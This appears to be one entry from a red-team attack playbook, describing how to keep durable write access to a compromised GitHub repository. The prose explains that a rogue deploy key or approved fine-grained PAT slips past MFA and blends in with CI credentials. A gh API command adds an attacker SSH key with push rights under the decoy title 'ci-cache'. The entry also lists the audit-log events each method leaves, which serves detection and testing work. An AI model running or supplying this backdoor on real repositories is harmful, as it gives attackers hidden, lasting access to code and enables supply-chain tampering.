---
id: gh-deploy-key-backdoor
title: Deploy key / fine-grained PAT backdoor (durable repo access)
section: GitHub / CI/CD
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1098]
platform: [github]
source: GitHub post-compromise persistence (deploy key / PAT)
pair: gh-cred-audit
---

Add your own credential so access outlives the compromised session: a writable SSH
**deploy key** gives durable clone/push to one repo with no user, no MFA, and no
password to reset; a **fine-grained PAT** (granted/approved in an org) does the same
across scoped repos. Both are non-interactive and easy to overlook among legitimate
CI credentials. The deploy key writes `repo.create_deploy_key`; a PAT grant writes
`personal_access_token.access_granted`. (Cloud CI — no slots.)

```sh
# add an attacker deploy key with write access (read_only=false = push, not just pull)
gh api -X POST /repos/<owner>/<repo>/keys -f title='ci-cache' -f key="$(cat rogue.pub)" -F read_only=false
# — or request/approve a fine-grained PAT in the org (personal_access_token.access_granted)
```
